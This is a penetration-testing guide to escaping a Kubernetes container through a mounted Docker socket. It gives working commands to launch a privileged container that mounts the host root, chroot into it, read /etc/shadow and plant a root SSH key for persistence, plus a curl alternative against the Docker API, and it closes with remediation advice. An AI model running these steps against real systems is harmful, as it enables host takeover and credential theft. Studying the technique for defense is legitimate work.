
# Docker Socket Mount Exploitation for Container Escape in Kubernetes

## 1. Overview

This document details the exploitation of a common Kubernetes misconfiguration where the Docker socket (`/var/run/docker.sock`) is mounted into a container. This allows an attacker inside the container to control the host's Docker daemon, leading to container escape and potential full host compromise.

**Attack Vector Description:**

An attacker gains initial access to a container. If the container mounts the Docker socket, the attacker can then interact with the Docker daemon running on the host. This allows for the creation of new, privileged containers that mount the host's root filesystem, providing the attacker with complete control over the node.

**Potential Impact and Consequences:**

*   **Container Escape:** Attacker gains access to the host system.
*   **Host Compromise:** Full control over the Kubernetes node.
*   **Lateral Movement:** Pivot to other resources within the cluster.
*   **Data Breach:** Access to sensitive data stored on the host or within the cluster.
*   **Denial of Service:** Potential to disrupt or shut down the entire Kubernetes cluster.

**Risk Level Assessment:**

**Critical** - Due to the potential for complete host compromise and lateral movement within the cluster.

**Technical Explanation:**

The Docker socket (`/var/run/docker.sock`) is the primary interface for interacting with the Docker daemon. By mounting this socket into a container, the container effectively has the same privileges as the Docker daemon itself. This bypasses containerization boundaries and allows the container to manipulate the host system through Docker commands.

**Prerequisites and Conditions Needed:**

*   Initial access to a container within the Kubernetes cluster.
*   The target container must have the `/var/run/docker.sock` mounted into its filesystem. This is often a misconfiguration stemming from attempts to run Docker-in-Docker solutions or misconfigured CI/CD pipelines.
*   `docker` command-line tool (or a compatible Docker API client) installed inside the compromised container (or ability to download and install it). If Docker is not present a tool like `curl` can be used to interact directly with the docker socket (requires JSON formatting).

## 2. Validation and Exploitation Steps

**Phase 1: Validation (Checking for the Vulnerability)**

**Step 1: Check if Docker is installed**

```bash
which docker
```

*   **Explanation:**  Verifies if the `docker` command-line tool is available within the container.  This is needed to interact with the Docker daemon.
*   **Expected Output:**  `/usr/bin/docker` (or similar path).  If no output, Docker is not installed, and you need to either install it or use an alternative method of communicating with the Docker daemon, such as using `curl` to interact with the Docker API directly.
*   **Contribution:**  Determines if the basic tool required for exploitation is present.

**Step 2: Check for the Docker socket mount**

```bash
ls -l /var/run/docker.sock
```

*   **Explanation:** Verifies if the Docker socket exists within the container's filesystem.  The Docker socket is the entry point for interacting with the Docker daemon.
*   **Expected Output:** `srw-rw---- 1 root docker 0 Oct 26 14:32 /var/run/docker.sock` (or similar output indicating a socket file). If the file doesn't exist, the container isn't vulnerable.
*   **Contribution:** Confirms the presence of the Docker socket, a crucial element of the vulnerability.

**Step 3 (Alternative if 'ls' isn't available or mounted as a file): Try to connect to the docker daemon directly**

```bash
docker info
```

*   **Explanation:** This attempts to directly interact with the docker daemon using the `docker info` command. Even if the socket is present, it might be mounted incorrectly.
*   **Expected Output:** Information about the Docker daemon (e.g., number of containers, images, kernel version). Any error messages regarding connection refusal, permissions, or similar issues indicate a problem.  However, a successful connection confirms the vulnerability.
*   **Contribution:** This confirms the ability to communicate with the docker daemon.

**Phase 2: Exploitation (Gaining Host Access)**

**Step 4: Create a privileged container that mounts the host's root filesystem**

```bash
docker run -it --rm --privileged --pid=host --net=host --volume /:/mnt alpine /bin/sh
```

*   **Explanation:** This command creates a new Docker container with the following options:
    *   `-it`: Interactive terminal.
    *   `--rm`: Automatically removes the container when it exits.
    *   `--privileged`:  Grants the container almost all of the capabilities of the host.
    *   `--pid=host`: Shares the host's process ID namespace with the container, allowing the container to see all processes running on the host.
    *   `--net=host`: Shares the host's network namespace with the container, allowing the container to access the host's network interfaces.
    *   `--volume /:/mnt`: Mounts the host's root filesystem (`/`) into the container's `/mnt` directory.
    *   `alpine`:  Uses a minimal Alpine Linux image for the container.
    *   `/bin/sh`: Starts a shell inside the container.
*   **Expected Output:** A shell prompt within the newly created container.
*   **Contribution:** Creates a container that has access to the host's filesystem.

**Step 5: Chroot into the host's filesystem**

```bash
chroot /mnt
```

*   **Explanation:** This command changes the root directory of the current process to `/mnt`, which is where the host's root filesystem is mounted. This effectively makes the container "become" the host.  **Note:** If `chroot` is not installed, you can use `pivot_root` (more complex).
*   **Expected Output:** The command prompt may change depending on the host system's configuration. You are now operating from within the host's filesystem.
*   **Contribution:**  Gives the attacker a root shell on the host.

**Step 6: Verify host access (optional)**

```bash
whoami
```

*   **Explanation:** Check the current user.  If exploitation successful, you should be able to verify the `root` user.

```bash
cat /etc/shadow
```

*   **Explanation:** Check the `/etc/shadow` file, this usually requires root access.
*   **Expected Output:** If successful, the content of the `/etc/shadow` file will be displayed.

**Step 7: Post-Exploitation (Example: Add a SSH Key)**

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." > /root/.ssh/authorized_keys
```

*   **Explanation:** Adds an SSH key to the host's root user's `authorized_keys` file. Replace `AAAAB3NzaC1yc2EAAAADAQABAAABgQC...` with your public SSH key.
*   **Expected Output:** No output.
*   **Contribution:** Allows persistent SSH access to the compromised host.

**Alternative Exploitation - Direct Docker API Interaction (If docker CLI isn't available)**

If the `docker` CLI is not available inside the compromised container, you can interact directly with the Docker API through the Docker socket using tools like `curl`. This requires understanding the Docker API specification.

**Example: Creating a new container (Alternative for Step 4)**

```bash
curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["/bin/sh"], "HostConfig": {"Privileged": true, "NetworkMode": "host", "PidMode": "host", "Binds": ["/:/mnt"]}}' http://localhost/containers/create
```

*   **Explanation:** Sends a POST request to the Docker API's `/containers/create` endpoint to create a new container. The JSON payload specifies the image to use ("alpine"), the command to run ("/bin/sh"), and the host configuration (privileged, network mode, PID mode, and volume binding).
*   **Expected Output:** A JSON response containing the container ID.
*   **Contribution:** Creates a container that has access to the host's filesystem using Docker API.  From here on, steps 5 and 6 are identical.

**Remediation Recommendations:**

*   **Avoid mounting the Docker socket into containers unless absolutely necessary.**  Re-evaluate the architecture and explore alternative solutions that don't require direct access to the Docker daemon.
*   **If mounting the Docker socket is unavoidable, consider using a dedicated Docker API proxy with limited privileges.** This allows containers to interact with the Docker daemon but restricts the available API calls and capabilities.
*   **Implement strong container security policies and monitoring.** Use tools like NetworkPolicy to restrict network access, AppArmor/Seccomp to limit system calls, and audit logs to detect suspicious activity.
*   **Regularly scan containers and images for vulnerabilities.** Use vulnerability scanners to identify and address potential security flaws in container images and running containers.
*   **Use a more robust container orchestration platform like Kubernetes, which offers native security features and policies to mitigate the risk of container escape.** Ensure you're leveraging features like Pod Security Policies (replaced by Pod Security Admission) to enforce security constraints.

This documentation provides a comprehensive guide to exploiting the Docker socket mount vulnerability. It is crucial to understand these techniques for ethical penetration testing and to implement appropriate security measures to prevent exploitation in real-world environments.
